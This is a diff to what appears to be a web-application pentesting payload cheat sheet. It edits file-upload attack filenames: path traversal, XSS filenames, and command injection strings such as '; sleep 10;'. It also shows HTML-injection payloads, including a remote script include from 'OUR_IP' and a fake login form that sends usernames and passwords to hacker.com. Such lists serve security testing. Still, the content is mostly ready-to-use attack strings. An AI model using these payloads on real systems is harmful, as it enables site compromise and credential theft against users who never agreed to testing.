@@ -1332,9 +1332,9 @@ onerror=alert(document.doamain)_-Copy.csv
 <script type="text/javascript">
 alert(11);
 </script>
-10- filename =>  ../../../tmp/lol.png
+10- filename =>  ../../../tmp/lol.png	
 11- sleep(10) — -.jpg
-12- filename=> <svg onload=alert(document.domain)>
+12- filename=> <svg onload=alert(document.domain)>	or <script>alert(1)</script>.txt	
 13- filename=> ; sleep 10;
 14- upload file with same name already exist to see the abslute path 
 15- upload directory with .asp extension as folder.asp\file.txt
@@ -1415,6 +1415,7 @@ HTML INJECTION
 <script src="http://OUR_IP/script.js"></script>
 http://vulnuerable.com/phishing/index.php?url=document.write('<h3>Please login to continue</h3><form action=http://hacker.com/file.php><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
 
+2- http://example.com/dir/<h1>hossam</h1>?debug=layout
 
 
 
